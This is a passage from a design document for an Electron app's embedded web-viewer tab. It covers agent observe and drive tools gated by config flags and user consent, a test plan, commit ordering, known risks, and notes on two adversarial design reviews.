timeout and its own concurrency. It never touches `workflow_runs`, never enters the questions
table, and multiple pending prompts coexist. The awaiting MCP handler holds a promise with
`timeoutMs: null`; `revokeRun` rejects any outstanding prompt with `consent_denied`.

**Audit trail**: every agent-initiated open, every grant and revocation, every drive verb and
every privileged read is written to `session_web_events` (§5) and surfaced in a per-tab activity
view with per-tab revocation.

**Kill switch.** Every comparably risky capability in this repo is gated by an
`AppConfig.<x>Enabled` flag enforced authoritatively in `ConfigManager` with the renderer
merely hiding UI (`assistantEnabled`, `codeReviewEvalEnabled`, `visualVerify`). Add to **both**
`AppConfig` (~`config.ts:214`, beside `visualVerify`) and `UpdateConfigRequest` (~`:366`) —
the repo keeps these in parity and a field missing from the second cannot be written:

```ts
webViewer?: { enabled?: boolean; agentObserve?: boolean; agentDrive?: boolean; persistLogin?: boolean }
```

Not seeded into constructor defaults; floors applied on read, so `config.json` stays
byte-identical for users who never touch it (mirror `ResolvedIdleSessionReviewConfig` /
`IDLE_SESSION_REVIEW_DEFAULTS`). Defaults: `enabled: true` (human browsing is the feature),
`agentObserve: false`, `agentDrive: false`, `persistLogin: true`. So **human browsing ships on
and every agent capability ships off** — not "the whole feature is off by default", which an
earlier draft said in one place and contradicted in another.

**A nested block needs a strict schema and a deep merge — neither exists today.** The config
tRPC input accepts any plain object (`routers/config.ts:66-78`), `configOps.ts:40-57` validates
only selected provider fields, and `ConfigManager.updateConfig` is a shallow top-level spread
(`configManager.ts:233-235`). Two concrete failures follow: a string `"false"` passes input
validation and is then truthy, and a partial update like `{webViewer: {agentDrive: true}}`
**replaces the whole block**, so an omitted `enabled` falls back to the `true` floor and a
partial write can silently re-enable a feature a user turned off. So commit 1 also lands a strict
runtime schema for the complete block (booleans only, unknown keys rejected) and merges nested
fields against the existing resolved block, preserving an explicit `enabled: false`. Partial
updates get a test.

## 8. Interaction with the repo's own verification

Two real collisions, both new to "Known risks":

- `driverCore.ts:984` captures via Playwright `page.screenshot()`, a renderer-surface capture.
  A `WebContentsView` composites **above** the renderer DOM, so a CDP screenshot of a
  web-viewer tab shows the bounds-anchor rect **empty**. Any visual verification whose
  acceptance depends on seeing embedded page content must run under the `native-screen`
  modality.
- `driverCore.ts:888-912 ensurePage` picks the first non-devtools CDP page. An open viewer tab
  is another page on the same `:9223` endpoint, so the driver can attach to the embedded site
  instead of the cyboflow UI. Fix by positive selection: the `cdp-app` modality already
  carries `attestation: { kind: 'cdp-token', expression, expected }`; export it to the driver
  and select the page that satisfies it.

## 9. Test plan

Pure unit (no Electron): guard policy table; consent grant / revoke / principal-change and
provisional-navigation rejection; LRU eviction **with pins, proving the hard caps hold against a
pin flood**; `maxTabs` rejection; bounds rounding under zoom; ring-buffer capping and cursor
semantics; the URL redactor (userinfo / query / fragment stripped, pre-grant listing exposes
origin only); request-id correlation with a missing `onBeforeRequest`; nullable frame
attribution landing in `unattributed`; `human_touched` flipping an agent tab to gated;
**suspension never changes a committed URL**; config partial-update merge preserving
`enabled: false`; and a test proving **no flag combination unlocks a human-tab read before the
consent implementation exists**.

Existing gates this change must satisfy — note the last two, which the first draft missed:
`noNewIpcHandlers`, `ipcChannelRegistration`, `preloadInvokeAllowlist`, `fileSizeRatchet`,
`toolRegistryRatchet`, `migrationPrefixes`, `verify:schema`, `ompGateConfigBuilder`,
**`standaloneInvariant`**, and **`pnpm --filter main lint`** (eslint is error-level for the
import ban, not a warning).

Integration: MCP tool round-trip on the mocked-SDK harness, including a `disposeSession` /
`revokeRun` teardown assertion (no surviving view, listener, grant, pin or capture).
E2E: a `WebContentsView` is not `app.firstWindow()` — assert via `app.evaluate()` over
`webContents.getAllWebContents()`. Keep `test:ci:minimal` (branch-protected) asserting only
the tab strip.
Manual: `CYBOFLOW_DIR=~/.cyboflow_test pnpm dev`, then a **packaged** build check — the
CSP/dev asymmetry is exactly the class dogfooding misses.

## 10. Commit staging

| # | Commit | Note |
| --- | --- | --- |
| 1 | `feat: webViewer config block + kill switch` | lands first; everything after is gated |
| 2 | `feat: 'web' TabKind + opaque ids + store action + strip glyph` | tab opens, placeholder body |
| 3 | `feat: main-process manager, guard, partitions, tRPC router, composition` | includes `before-input-event` forwarder and `context-menu` handler |
| 4a | `feat: occlusion counter — central hooks` | 6 edits |
| 4b | `feat: occlusion counter — residual overlays` | 14 enumerated sites |
| 5 | `feat: suspend/resume, agent pin, hard caps, crash state` | |
| 6 | `feat: persist web tabs + audit table; session teardown` | migration 145; `disposeSession` / `revokeRun` |
| 7 | `feat: chat link routing via WebLinkContext` | edits the existing `a` override |
| 8 | `feat: telemetry ring buffers + redactor` | non-CDP sources; request-id correlation |
| 9 | `feat: consent surface + grants + revocation UI` | **before** any agent read exists |
| 10 | `feat: MCP observe tools` | carries its own `mcpQueryHandler` extraction + OMP names |
| 11 | `feat: MCP drive tools` | |
| 12 | `fix: verify driver page selection via cdp-token attestation` | |
| 13 | `docs: ARCHITECTURE, SHELL-LAYOUT, CODE-PATTERNS` | SHELL-LAYOUT's navigation-store contract requires documenting any new App-level mount condition |

**Consent lands before observation, not after.** The original order put the MCP observe tools at
9 and consent at 10, which meant a tree at commit 9 — reached by a staging mistake, a hand-edited
`config.json`, or simply someone flipping `agentObserve` early — had human-tab reads with no
authorization mechanism in existence. Swapping them removes the window entirely. As a belt, the
observe commit also rejects any read of an `opened_by='user'` or `human_touched` tab
unconditionally when no grant store is present, with the test named in §9.

Every step is independently shippable: human browsing is usable from commit 3, every agent
capability stays off behind step 1's flags, and no step leaves a user-visible broken surface.

## 11. Known risks

- **`trpc-electron` patch tripwire.** `patches/trpc-electron@0.1.2.patch` exists because a
  subframe `did-start-navigation` aborted the main frame's tRPC subscriptions. A
  navigation-heavy embedded view re-enters that path. A `WebContentsView` is a separate
  `WebContents` rather than a subframe, so it may be unaffected — smoke-test explicitly.
  `pnpm patch` requires editing both `dist/main.cjs` and `dist/main.mjs`.
- Occlusion is a standing invariant a future overlay can break — hence the registry and lint
  test in §3.7 rather than a one-time file list.
- Pointer lock and page-initiated fullscreen from a remote page are unspecified in v1; both
  should be denied until there is a reason to allow them.
- Two cyboflow instances cannot share the persistent partition — the single-instance lock
  (`main/src/index.ts:853-896`) is taken after `userData` is selected, so a second instance with
  a *different* `CYBOFLOW_DIR` gets its own partition and there is no cross-instance cookie
  contention. Worth re-checking if that lock ever moves.
- Migration prefix collision with unmerged worktrees.
- Packaged-vs-dev asymmetry (CSP, favicon, capture).
- Windows bounds/DPI behaviour differs; `build:win` is Windows-host-only.
- Two viewers for a localhost dev server until `LiveCanvasEmbed` converges. When it does, the
  only branch to change is `else if (hasUrl && url)` in `CanvasBody`
  (`ArtifactTabRenderer.tsx:2626-2627`) — leave the `{html}` srcDoc arm alone, it is the
  opaque-origin path `ApprovedDesignTab` and `DesignStageCanvas` depend on.

## Evidence

A six-agent read-only survey mapped the center-pane tab model, chat link rendering, Electron
embedding precedent, the MCP tool surface, the visual-verification stack and the panel
substrate. A four-lens adversarial critique (Electron correctness, repo/CI compliance,
security, completeness) produced 55 findings against the first draft; each was independently
verified against the tree, 46 confirmed and 9 refuted.

A second, independent adversarial review by Codex (`gpt-6-astra`, read-only, high reasoning)
then produced 17 findings against that revision — 4 blocking, 10 major, 3 minor. All 17 were
re-verified against the tree and all 17 held, including one that **overturned** a fix taken from
the first round: reusing `QuestionRouter` for the consent prompt (§7). Codex also mis-cited three
paths that do not exist (`scripts/check-csp.mjs`, `scripts/verify-mcp-tool-registry.mjs`,
`scripts/verify-omp-tool-allowlist.mjs`) and placed the renderer CSP in `frontend/index.html`
rather than `frontend/vite.config.ts:66`; no finding rested on those, and the real gates are the
vitest suites named in §9.

Everything from both rounds is folded in above. The document has not been implemented, so none
of it is proven by running code.
